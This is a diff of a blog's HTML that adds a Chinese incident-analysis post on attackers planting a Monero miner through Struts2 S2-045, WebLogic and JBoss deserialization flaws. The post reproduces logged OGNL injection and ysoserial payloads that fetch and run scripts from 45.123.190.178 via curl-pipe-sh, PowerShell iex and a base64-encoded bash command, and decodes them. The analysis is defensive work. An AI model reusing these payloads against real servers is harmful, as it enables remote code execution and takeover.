@@ -51,9 +51,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
@@ -91,7 +91,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjc7iqrr500065s1bbe9l9czi" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjca1zrwa0008881bdqr7bsq6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -101,10 +101,10 @@
 
 
   
-    <article id="post-浏览器工作原理" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-利用java反序列化漏洞植入门罗币挖矿程序事件分析" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2018/01/05/浏览器工作原理/" class="article-date">
-  <time datetime="2018-01-05T11:09:25.000Z" itemprop="datePublished">2018-01-05</time>
+    <a href="/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/" class="article-date">
+  <time datetime="2018-01-10T13:11:50.000Z" itemprop="datePublished">2018-01-10</time>
 </a>
     
   </div>
@@ -115,7 +115,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/05/浏览器工作原理/">浏览器工作原理</a>
+      <a class="article-title" href="/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/">利用java反序列化漏洞植入门罗币挖矿程序事件分析</a>
     </h1>
   
 
@@ -123,14 +123,237 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/" target="_blank" rel="external">https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/</a></p>
-<p><a href="https://kb.cnblogs.com/page/129756/#chapter8" target="_blank" rel="external">https://kb.cnblogs.com/page/129756/#chapter8</a></p>
-<p>两个链接内容一样的，为防止其中一个失效</p>
+        <p>近期检测到某台主机利用多个漏洞植入挖矿程序的行为，下面简单分析一下：</p>
+<p>最近几天<strong>45.123.190.147</strong>这个ip，连续发起恶意请求，相关日志如下：</p>
+<p>s2-045相关日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 51977 172.17.0.2 8080 - - [08/Jan/2018:15:59:08 +0000] <span class="string">"POST /orders.xhtml HTTP/1.1"</span> [--9b4e930e84c24dd896eac1be4a4dfa8c</div><div class="line">Content-Disposition: form-data; name=<span class="string">"fieldNameHere"</span>; filename=<span class="string">"123.html"</span></div><div class="line"></div><div class="line">testtest</div><div class="line">--9b4e930e84c24dd896eac1be4a4dfa8c--</div><div class="line">] 400 - [python-requests/2.18.4] [%&#123;(<span class="comment">#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl 45.123.190.178/lin.txt | sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.134 2715</span></div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 49290 172.17.0.2 8080 - - [07/Jan/2018:02:51:10 +0000] <span class="string">"POST /orders.xhtml HTTP/1.1"</span> [--167f39dfb34648d58ec2d781097677a6</div><div class="line">Content-Disposition: form-data; name=<span class="string">"fieldNameHere"</span>; filename=<span class="string">"123.html"</span></div><div class="line"></div><div class="line">testtest</div><div class="line">--167f39dfb34648d58ec2d781097677a6--</div><div class="line">] 400 - [python-requests/2.18.4] [%&#123;(<span class="comment">#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='powershell -nop -c "iex(New-Object Net.WebClient).DownloadString(\'http://45.123.190.178/win.txt\')"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.798 2715</span></div></pre></td></tr></table></figure>
+<p>可以看到这里利用的是 S2-045 漏洞，发送恶意 ognl 表达式，关键命令是从远程服务器下载脚本并执行，稍后再看这两个脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl 45.123.190.178/lin.txt | sh</div><div class="line">powershell -nop -c <span class="string">"iex(New-Object Net.WebClient).DownloadString(\'http://45.123.190.178/win.txt\')"</span></div></pre></td></tr></table></figure>
+<p>weblogic wls反序列化漏洞相关日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 34220 172.17.0.2 8080 - - [08/Jan/2018:16:05:05 +0000] <span class="string">"GET /wls-wsat/CoordinatorPortType11 HTTP/1.1"</span> [] 404 - [python-requests/2.18.4] [-] 0.011 1051</div><div class="line">45.123.190.147 34280 172.17.0.2 8080 - - [08/Jan/2018:16:05:05 +0000] <span class="string">"GET /wls-wsat/CoordinatorPortType HTTP/1.1"</span> [] 404 - [python-requests/2.18.4] [-] 0.003 1051</div></pre></td></tr></table></figure>
+<p>它探测了 wls-wsat 模块是否存在，这个模块联系到前几天爆发的weblogic wls反序列化漏洞，如果能够访问存在缺陷的模块就发起攻击，说明 XMLDecoder 漏洞也正在被用于黑产行为</p>
+<p> JBoss JMXInvokerServlet 反序列化漏洞相关日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">45.123.190.147 58694 172.17.0.2 8080 - - [08/Jan/2018:17:27:44 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr 2sun.reflect.annotation.AnnotationInvocationHandlerU���~� L memberValuest Ljava/util/Map;L typet Ljava/lang/Class;xps&#125; java.util.Mapxr java.lang.reflect.Proxy�<span class="string">'� �C� L ht %Ljava/lang/reflect/InvocationHandler;xpsq ~ sr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</span></div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ vr java.lang.String��8z;�B xpvq ~ sq ~ uq ~ puq ~ t invokeuq ~ vr java.lang.Object xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G xp t fpowershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('http://45.123.190.178/win.txt<span class="string">')"t execuq ~ q ~ #sq ~ sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</span></div><div class="line">loadFactorI thresholdxp?@ w xxvr java.lang.Override xpq ~ :] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class="org".jboss.invocation.MarshalledValue] 0.008 1049</div><div class="line"></div><div class="line"></div><div class="line">45.123.190.147 58733 172.17.0.2 8080 - - [08/Jan/2018:17:27:44 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" [�� sr .javax.management.BadAttributeValueExpException��ګc-F@ L valt Ljava/lang/Object;xr java.lang.Exception��&gt;;� xr java.lang.Throwable��5'9w�� L causet Ljava/lang/Throwable;L detailMessaget Ljava/lang/String;[</div><div class="line">stackTracet [Ljava/lang/StackTraceElement;L suppressedExceptionst Ljava/util/List;xpq ~ pur [Ljava.lang.StackTraceElement;F*&lt;&lt;�<span class="string">"9 xp sr java.lang.StackTraceElementa Ś&amp;6݅ I</span></div><div class="line">lineNumberL declaringClassq ~ L fileNameq ~ L</div><div class="line">methodNameq ~ xp St &amp;ysoserial.payloads.CommonsCollections5t CommonsCollections5.javat getObjectsq ~ 5q ~ q ~ q ~ sq ~ "t ysoserial.GeneratePayloadt GeneratePayload.javat mainsr &amp;java.util.Collections<span class="variable">$UnmodifiableList</span>�%1�� L listq ~ xr ,java.util.Collections<span class="variable">$UnmodifiableCollectionB</span> ��^� L ct Ljava/util/Collection;xpsr java.util.ArrayListx����a� I sizexp w xq ~ xsr 4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9�� L keyq ~ L mapt Ljava/util/Map;xpt foosr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantq ~ xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNameq ~ [ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ 2 vr java.lang.String��8z;�B xpvq ~ 2sq ~ +uq ~ / puq ~ / t invokeuq ~ 2 vr java.lang.Object xpvq ~ /sq ~ +ur [Ljava.lang.String;��V��&#123;G xp t fpowershell.exe -nop -c <span class="string">"iex(New-Object Net.WebClient).DownloadString('http://45.123.190.178/win.txt')"</span>t execuq ~ 2 q ~ 7sq ~ <span class="string">'sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</span></div><div class="line">loadFactorI thresholdxp?@ w xx] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class="org".jboss.invocation.MarshalledValue] 0.002 1049</div><div class="line"></div><div class="line">45.123.190.147 54900 172.17.0.2 8080 - - [08/Jan/2018:19:24:35 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" [�� sr 2sun.reflect.annotation.AnnotationInvocationHandlerU���~� L memberValuest Ljava/util/Map;L typet Ljava/lang/Class;xps&#125; java.util.Mapxr java.lang.reflect.Proxy�'� �C� L ht %Ljava/lang/reflect/InvocationHandler;xpsq ~ sr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ vr java.lang.String��8z;�B xpvq ~ sq ~ uq ~ puq ~ t invokeuq ~ vr java.lang.Object xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G xp t Qbash -c &#123;<span class="built_in">echo</span>,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t execuq ~ q ~ <span class="comment">#sq ~ sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</span></div><div class="line"></div><div class="line">loadFactorI thresholdxp?@ w xxvr java.lang.Override xpq ~ :] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.009 1049</div><div class="line"></div><div class="line">45.123.190.147 55001 172.17.0.2 8080 - - [08/Jan/2018:19:24:35 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr java.util.HashSet�D�����4 xpw ?@ sr 4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9�� L keyt Ljava/lang/Object;L mapt Ljava/util/Map;xpt foosr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantq ~ xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ vr java.lang.String��8z;�B xpvq ~ sq ~ uq ~ puq ~ t invokeuq ~ vr java.lang.Object xpvq ~ sq ~ ur [Ljava.lang.String;��V��&#123;G xp t Qbash -c &#123;<span class="built_in">echo</span>,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t execuq ~ q ~ sq ~ sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</div><div class="line">loadFactorI thresholdxp?@ w xxx] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.003 1049</div><div class="line"></div><div class="line">45.123.190.147 55040 172.17.0.2 8080 - - [08/Jan/2018:19:24:36 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr .javax.management.BadAttributeValueExpException��ګc-F@ L valt Ljava/lang/Object;xr java.lang.Exception��&gt;;� xr java.lang.Throwable��5<span class="string">'9w�� L causet Ljava/lang/Throwable;L detailMessaget Ljava/lang/String;[</span></div><div class="line">stackTracet [Ljava/lang/StackTraceElement;L suppressedExceptionst Ljava/util/List;xpq ~ pur [Ljava.lang.StackTraceElement;F*&lt;&lt;�"9 xp sr java.lang.StackTraceElementa Ś&amp;6݅ I</div><div class="line">lineNumberL declaringClassq ~ L fileNameq ~ L</div><div class="line">methodNameq ~ xp St &amp;ysoserial.payloads.CommonsCollections5t CommonsCollections5.javat getObjectsq ~ 5q ~ q ~ q ~ sq ~ "t ysoserial.GeneratePayloadt GeneratePayload.javat mainsr &amp;java.util.Collections$UnmodifiableList�%1�� L listq ~ xr ,java.util.Collections$UnmodifiableCollectionB ��^� L ct Ljava/util/Collection;xpsr java.util.ArrayListx����a� I sizexp w xq ~ xsr 4org.apache.commons.collections.keyvalue.TiedMapEntry��қ9�� L keyq ~ L mapt Ljava/util/Map;xpt foosr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantq ~ xpvr java.lang.Runtime xpsr :org.apache.commons.collections.functors.InvokerTransformer���k&#123;|�8 [ iArgst [Ljava/lang/Object;L iMethodNameq ~ [ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp t</div><div class="line">getRuntimeur [Ljava.lang.Class;�׮��Z� xp t getMethoduq ~ 2 vr java.lang.String��8z;�B xpvq ~ 2sq ~ +uq ~ / puq ~ / t invokeuq ~ 2 vr java.lang.Object xpvq ~ /sq ~ +ur [Ljava.lang.String;��V��&#123;G xp t Qbash -c &#123;echo,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;t execuq ~ 2 q ~ 7sq ~ 'sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp sr java.util.HashMap���`� F</div><div class="line">loadFactorI thresholdxp?@ w xx] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.003 1049</div><div class="line"></div><div class="line">45.123.190.147 55074 172.17.0.2 8080 - - [08/Jan/2018:19:24:36 +0000] <span class="string">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> [�� sr java.util.PriorityQueue��0��?�� I sizeL</div><div class="line">comparatort Ljava/util/Comparator;xp sr Borg.apache.commons.collections4.comparators.TransformingComparator/���+�� L decoratedq ~ L transformert -Lorg/apache/commons/collections4/Transformer;xpsr @org.apache.commons.collections4.comparators.ComparableComparator���%�n�7 xpsr ;org.apache.commons.collections4.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst .[Lorg/apache/commons/collections4/Transformer;xpur .[Lorg.apache.commons.collections4.Transformer;9�:��?� xp sr &lt;org.apache.commons.collections4.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr 7com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter xpsr ?org.apache.commons.collections4.functors.InstantiateTransformer4�����; [ iArgst [Ljava/lang/Object;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp sr :com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl WO�n��3 I _indentNumberI _transletIndex[</div><div class="line">_bytecodest [[B[ _classq ~ L _namet Ljava/lang/String;L _outputPropertiest Ljava/util/Properties;xp ����ur [[BK�gg�7 xp ur [B���T� xp ����� 2 9</div><div class="line"><span class="string">" 7 % &amp; serialVersionUID J ConstantValue� ����&gt; &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this StubTransletPayload InnerClasses 5Lysoserial/payloads/util/Gadgets<span class="variable">$StubTransletPayload</span>; transform r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V document -Lcom/sun/org/apache/xalan/internal/xsltc/DOM; handlers B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</span></div><div class="line">Exceptions ' �(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V iterator 5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator; handler ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</div><div class="line">SourceFile Gadgets.java</div><div class="line">( 3ysoserial/payloads/util/Gadgets<span class="variable">$StubTransletPayload</span> @com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet java/io/Serializable 9com/sun/org/apache/xalan/internal/xsltc/TransletException ysoserial/payloads/util/Gadgets &lt;clinit&gt; java/lang/Runtime *</div><div class="line">getRuntime ()Ljava/lang/Runtime; , -</div><div class="line">+ . Qbash -c &#123;echo,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 0 exec '(Ljava/lang/String;)Ljava/lang/Process; 2 3</div><div class="line">+ 4 StackMapTable ysoserial/Pwner3888495553177549 !Lysoserial/Pwner3888495553177549; !</div><div class="line">/ *� � . 8 ? � 3 8 I � 7 * 8 ) $ � L� /1� 5W� 6 !</div><div class="line"># uq ~ ����� 2</div><div class="line">serialVersionUID J ConstantValueq�i�&lt;mG &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this Foo InnerClasses %Lysoserial/payloads/util/Gadgets<span class="variable">$Foo</span>;</div><div class="line">SourceFile Gadgets.java</div><div class="line">#ysoserial/payloads/util/Gadgets<span class="variable">$Foo</span> java/lang/Object java/io/Serializable ysoserial/payloads/util/Gadgets !</div><div class="line">/ *� � ;</div><div class="line">pt Pwnrpw xur [Ljava.lang.Class;�׮��Z� xp vr javax.xml.transform.Templates xpw sr java.lang.Integer⠤���8 I valuexr java.lang.Number������ xp q ~ )x] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class="org<span class="string">".jboss.invocation.MarshalledValue] 0.005 1049</span></div><div class="line"></div><div class="line">45.123.190.147 55115 172.17.0.2 8080 - - [08/Jan/2018:19:24:36 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1<span class="string">" [�� sr 2sun.reflect.annotation.AnnotationInvocationHandlerU���~� L memberValuest Ljava/util/Map;L typet Ljava/lang/Class;xps&#125; java.util.Mapxr java.lang.reflect.Proxy�'� �C� L ht %Ljava/lang/reflect/InvocationHandler;xpsq ~ sr *org.apache.commons.collections.map.LazyMapn唂�y� L factoryt ,Lorg/apache/commons/collections/Transformer;xpsr :org.apache.commons.collections.functors.ChainedTransformer0Ǘ�(z� [ iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;�V*��4� xp sr ;org.apache.commons.collections.functors.ConstantTransformerXv�A�� L iConstantt Ljava/lang/Object;xpvr 7com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter xpsr &gt;org.apache.commons.collections.functors.InstantiateTransformer4�����; [ iArgst [Ljava/lang/Object;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;��X�s)l xp sr :com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl WO�n��3 I _indentNumberI _transletIndex[</span></div><div class="line">_bytecodest [[B[ _classq ~ L _namet Ljava/lang/String;L _outputPropertiest Ljava/util/Properties;xp ����ur [[BK�gg�7 xp ur [B���T� xp ����� 2 9</div><div class="line">" 7 % &amp; serialVersionUID J ConstantValue� ����&gt; &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this StubTransletPayload InnerClasses 5Lysoserial/payloads/util/Gadgets<span class="variable">$StubTransletPayload</span>; transform r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V document -Lcom/sun/org/apache/xalan/internal/xsltc/DOM; handlers B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</div><div class="line">Exceptions <span class="string">' �(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V iterator 5Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator; handler ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</span></div><div class="line">SourceFile Gadgets.java</div><div class="line">( 3ysoserial/payloads/util/Gadgets$StubTransletPayload @com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet java/io/Serializable 9com/sun/org/apache/xalan/internal/xsltc/TransletException ysoserial/payloads/util/Gadgets &lt;clinit&gt; java/lang/Runtime *</div><div class="line">getRuntime ()Ljava/lang/Runtime; , -</div><div class="line">+ . Qbash -c &#123;echo,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 0 exec '(Ljava/lang/String;)Ljava/lang/Process; 2 3</div><div class="line">+ 4 StackMapTable ysoserial/Pwner3888495209839455 !Lysoserial/Pwner3888495209839455; !</div><div class="line">/ *� � . 8 ? � 3 8 I � 7 * 8 ) $ � L� /1� 5W� 6 !</div><div class="line"><span class="comment"># uq ~ # ����� 2</span></div><div class="line">serialVersionUID J ConstantValueq�i�&lt;mG &lt;init&gt; ()V Code LineNumberTable LocalVariableTable this Foo InnerClasses %Lysoserial/payloads/util/Gadgets<span class="variable">$Foo</span>;</div><div class="line">SourceFile Gadgets.java</div><div class="line"><span class="comment">#ysoserial/payloads/util/Gadgets$Foo java/lang/Object java/io/Serializable ysoserial/payloads/util/Gadgets !</span></div><div class="line">/ *� � ;</div><div class="line">pt Pwnrpw xur [Ljava.lang.Class;�׮��Z� xp vr javax.xml.transform.Templates xpsr java.util.HashMap���`� F</div><div class="line">loadFactorI thresholdxp?@ w xxvr java.lang.Override xpq ~ .] 404 - [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36] [application/x-java-serialized-object; class=<span class="string">"org"</span>.jboss.invocation.MarshalledValue] 0.003 1049</div></pre></td></tr></table></figure>
+<p>这几条日志访问的都是 /invoker/JMXInvokerServlet ，这个路径是涉及到的漏洞是 JBoss JMXInvokerServlet 反序列化漏洞， 发送包含恶意序列化对象的请求，导致远程代码执行，从里面看到相关的信息，关键的有两条：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &#123;<span class="built_in">echo</span>,Y3VybCA0NS4xMjMuMTkwLjE3OC9saW4udHh0IHwgc2gK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</div></pre></td></tr></table></figure>
+<p>解码后：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl 45.123.190.178/lin.txt | sh</div></pre></td></tr></table></figure>
+<p>和第一条日志的执行内容是一样的</p>
+<p>第二部分</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -c <span class="string">"iex(New-Object Net.WebClient).DownloadString('http://45.123.190.178/win.txt')"</span></div></pre></td></tr></table></figure>
+<p>可以看到都是与<strong>45.123.190.178</strong>进行通信，分别下载了linux和windows环境下的脚本，下面来看一下这两个脚本:</p>
